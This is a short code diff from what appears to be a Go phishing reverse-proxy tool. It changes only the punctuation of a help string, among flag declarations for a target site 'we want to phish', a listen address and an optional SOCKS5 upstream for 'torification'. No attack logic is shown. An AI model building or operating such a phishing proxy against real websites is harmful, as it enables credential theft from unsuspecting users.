@@ -19,7 +19,7 @@ const (
 )
 
 var (
-	targetURL      = flag.String("target", "", "The website we want to phish")
+	targetURL      = flag.String("target", "", "The website we want to phish.")
 	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
 	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
 	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
